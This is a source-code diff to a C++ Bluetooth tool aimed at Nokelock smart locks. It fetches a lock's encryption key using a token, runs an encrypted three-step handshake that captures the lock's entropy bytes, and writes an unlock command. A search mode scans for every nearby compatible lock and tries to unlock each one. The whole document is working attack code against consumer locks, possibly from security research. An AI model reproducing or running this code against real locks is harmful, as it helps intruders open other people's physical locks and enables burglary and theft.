@@ -13,6 +13,7 @@
 #include <csignal>
 #include <cstdint>
 #include <cstdlib>
+#include <iomanip>
 #include <iostream>
 #include <map>
 #include <memory>
@@ -182,7 +183,7 @@ nokelock::nokelock::ptr get_nokelock_keys(std::string const& token, std::string 
     size_t offset = 0;
 
     while (getline(key_string, byte, ',') and offset < 16) {
-        key[offset++] = std::atoi(byte.c_str());
+        key[offset++] = std::stoi(byte);
     }
 
     auto new_lock = nokelock::nokelock::make_nokelock(lock_mac, key);
@@ -192,39 +193,110 @@ nokelock::nokelock::ptr get_nokelock_keys(std::string const& token, std::string 
     return new_lock;
 }
 
+enum lock_state {
+    STATE_SEARCHING,
+    STATE_ATTACH_NOTIFY,
+    STATE_HANDSHAKE_1,
+    STATE_HANDSHAKE_2,
+    STATE_HANDSHAKE_3,
+    STATE_SEND_UNLOCK_CMD,
+    STATE_WAIT_UNLOCK_NOTIFY,
+    STATE_WAIT_UNLOCK_FINISH,
+    STATE_DONE,
+};
+
 void connect_nokelock(std::string const& token, std::string const& lock_mac)
 {
     bool done = false;
 
     auto lock = get_nokelock_keys(token, lock_mac);
 
+    std::array<std::uint8_t, 4> entropy;
+
+    lock_state state = STATE_SEARCHING;
+
     // Set up the Nokelock known GATT services of interest
-    BLEPP::UUID notification("36f5");
-    BLEPP::UUID command("fee7");
+    BLEPP::UUID command("36f5");
+    BLEPP::UUID notify("36f6");
+    BLEPP::UUID lock_service("fee7");
     BLEPP::UUID name("2a00");
 
     BLEPP::BLEGATTStateMachine gatt;
 
-    // Callback that's hit when the device is found, along with its details
-    std::function<void()> on_found_service = [&gatt, &notification, &command, &name, &done]() {
-        for (auto& service: gatt.primary_services) {
-            std::cout << "Service UUID: " << to_str(service.uuid) << " (Handle " << service.start_handle << " to " << service.end_handle << ")" << std::endl;
+    // Notification callback
+    std::function<void (BLEPP::PDUNotificationOrIndication const&)> on_notify = [&](BLEPP::PDUNotificationOrIndication const& notify) {
+        auto notify_data = notify.value().first;
+        std::array<std::uint8_t, 16> cmd;
+        std::copy(notify_data, notify_data + 16, cmd.begin());
+        auto plaintext = lock->decrypt_message(cmd);
 
+        std::cout << "Got notification!" << std::endl;
+
+        for (auto v: plaintext) {
+            std::cout << std::setw(2) << std::setfill('0') << std::hex << int(v) << ", ";
+        }
+        std::cout << std::dec << std::endl;
+
+        switch (state) {
+        case STATE_HANDSHAKE_1:
+            entropy[0] = plaintext[3];
+            entropy[1] = plaintext[4];
+            entropy[2] = plaintext[5];
+            entropy[3] = plaintext[6];
+            state = STATE_HANDSHAKE_2;
+            break;
+        case STATE_HANDSHAKE_3:
+            state = STATE_SEND_UNLOCK_CMD;
+            break;
+        case STATE_WAIT_UNLOCK_NOTIFY:
+            std::cout << "Got unlock notify" << std::endl;
+            state = STATE_WAIT_UNLOCK_FINISH;
+            break;
+        case STATE_WAIT_UNLOCK_FINISH:
+            state = STATE_DONE;
+        default:
+            break;
+        }
+    };
+
+    // Callback that's hit when the device is found, along with its details
+    std::function<void()> on_found_service = [&]() {
+        bool command_found = false;
+        bool notify_found = false;
+        for (auto& service: gatt.primary_services) {
+            std::cout << "Service UUID: " << BLEPP::to_str(service.uuid) << " (Handle " << service.start_handle << " to " << service.end_handle << ")" << std::endl;
+
+#if 0
+            if (not (service.uuid == lock_service)) {
+                continue;
+            }
+#endif
+
+            // First find the notify characteristic and install a callback handler
             for (auto& characteristic: service.characteristics) {
-                if (characteristic.uuid == notification) {
-                    std::cout << "  I have Nokelock Notification capabilities" << std::endl;
-                } else if (characteristic.uuid == command) {
+                std::cout << "  Characteristic: " << BLEPP::to_str(characteristic.uuid) << std::endl;
+                if (characteristic.uuid == notify) {
+                    notify_found = true;
+                    std::cout << "  I have Nokelock Notify capabilities" << std::endl;
+
+                    characteristic.cb_notify_or_indicate = on_notify;
+                    characteristic.set_notify_and_indicate(true, false);
+                }
+            }
+
+            state = STATE_ATTACH_NOTIFY;
+
+            // Now find the command endpoint (just make sure it's there)
+            for (auto& characteristic: service.characteristics) {
+                if (characteristic.uuid == command) {
+                    command_found = true;
+
                     std::cout << "  I have Nokelock Command capabilities" << std::endl;
-                } else if (characteristic.uuid == name) {
-                    characteristic.cb_read = [&](const BLEPP::PDUReadResponse& resp) {
-                        auto val = resp.value();
-                        std::cout << "  My name is " << std::string(val.first, val.second) << std::endl;
-                    };
                 }
             }
         }
 
-        done = true;
+        done = not (command_found and notify_found);
     };
 
     // Setup the scan
@@ -244,6 +316,90 @@ void connect_nokelock(std::string const& token, std::string const& lock_mac)
 
     while (false == done && false == terminate) {
         gatt.read_and_process_next();
+
+        // Make sure the GATT state machine is idle
+        if (not gatt.is_idle()) {
+            continue;
+        }
+
+        switch (state) {
+        case STATE_ATTACH_NOTIFY:
+            // Send initial command
+            std::cout << "DEBUG: sending initial command" << std::endl;
+            for (auto& service: gatt.primary_services) {
+                for (auto& characteristic: service.characteristics) {
+                    if (characteristic.uuid == command) {
+                        // Write the connect command out
+                        std::array<std::uint8_t, 16> cmd = { 0x06, 0x01, 0x01, 0x01 };
+
+                        for (auto v: cmd) {
+                            std::cout << std::setw(2) << std::setfill('0') << std::hex << int(v) << ", ";
+                        }
+                        std::cout << std::dec << std::endl;
+
+                        auto cmd_enc = lock->encrypt_message(cmd);
+                        characteristic.write_request(cmd_enc);
+
+                        state = STATE_HANDSHAKE_1;
+                    }
+                }
+            }
+            break;
+
+        case STATE_HANDSHAKE_2:
+            std::cout << "DEBUG: sending followup handshake" << std::endl;
+            for (auto& service: gatt.primary_services) {
+                for (auto& characteristic: service.characteristics) {
+                    if (characteristic.uuid == command) {
+                        // Write the connect command out
+                        std::array<std::uint8_t, 16> cmd = { 0x02, 0x01, 0x01, 0x01, entropy[0], entropy[1], entropy[2], entropy[3], 0x06, 0x02,  };
+                        for (auto v: cmd) {
+                            std::cout << std::setw(2) << std::setfill('0') << std::hex << int(v) << ", ";
+                        }
+                        std::cout << std::dec << std::endl;
+
+                        auto cmd_enc = lock->encrypt_message(cmd);
+                        characteristic.write_request(cmd_enc);
+
+                        state = STATE_HANDSHAKE_3;
+                    }
+                }
+            }
+            break;
+
+        case STATE_SEND_UNLOCK_CMD:
+            std::cout << "DEBUG: sending third handshake" << std::endl;
+            for (auto& service: gatt.primary_services) {
+                for (auto& characteristic: service.characteristics) {
+                    if (characteristic.uuid == command) {
+                        // Write the connect command out
+                        std::array<std::uint8_t, 16> cmd = { 0x05, 0x01, 0x06, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, entropy[0], entropy[1], entropy[2], entropy[3] };
+
+                        for (auto v: cmd) {
+                            std::cout << std::setw(2) << std::setfill('0') << std::hex << int(v) << ", ";
+                        }
+                        std::cout << std::dec << std::endl;
+
+                        auto cmd_enc = lock->encrypt_message(cmd);
+                        characteristic.write_request(cmd_enc);
+
+                        state = STATE_WAIT_UNLOCK_NOTIFY;
+                    }
+                }
+            }
+            break;
+
+        case STATE_HANDSHAKE_1:
+        case STATE_HANDSHAKE_3:
+        case STATE_WAIT_UNLOCK_FINISH:
+        case STATE_WAIT_UNLOCK_NOTIFY:
+        case STATE_SEARCHING:
+            continue;
+
+        default:
+            std::cout << "Unexpected state, aborting the loop" << std::endl;
+            done = true;
+        }
     }
 
     // No need to remain connected
@@ -270,8 +426,6 @@ std::vector<std::string> find_nokelocks(std::size_t nr_iters = 10)
     BLEPP::HCIScanner scanner(true, BLEPP::HCIScanner::FilterDuplicates::Software,
             BLEPP::HCIScanner::ScanType::Active);
 
-    std::signal(SIGINT, _on_sigint);
-
     while (false == terminate and iter_id++ < nr_iters) {
         FD_SET(scanner.get_fd(), &fd_scan);
 
@@ -288,7 +442,7 @@ std::vector<std::string> find_nokelocks(std::size_t nr_iters = 10)
                 for (auto const& uuid: resp.UUIDs) {
                     if (uuid == notification) {
                         std::cout << "Device found: " << resp.address << std::endl;
-                        std::cout << "  Service: " << to_str(uuid) << std::endl;
+                        std::cout << "  Service: " << BLEPP::to_str(uuid) << std::endl;
 
                         locks.push_back(resp.address);
                         break;
@@ -297,8 +451,6 @@ std::vector<std::string> find_nokelocks(std::size_t nr_iters = 10)
             }
         }
     }
-
-    std::cout << "Scan terminated." << std::endl;
 
     return locks;
 }
@@ -339,12 +491,14 @@ int main(int const argc, char const* const argv[])
 
     bool search = args["search"].as<bool>();
 
+    // Catch SIGINT, so we can clean up nicely
+    std::signal(SIGINT, _on_sigint);
+
     if (true == search) {
         // Search for all Nokelock compatible locks we can find
         std::cout << "Searching for locks to unlock" << std::endl;
         while (false == terminate) {
             auto locks = find_nokelocks();
-            std::cout << "Found " << locks.size() << " locks." << std::endl;
             for (auto const& lock: locks) {
                 connect_nokelock(token, lock);
             }
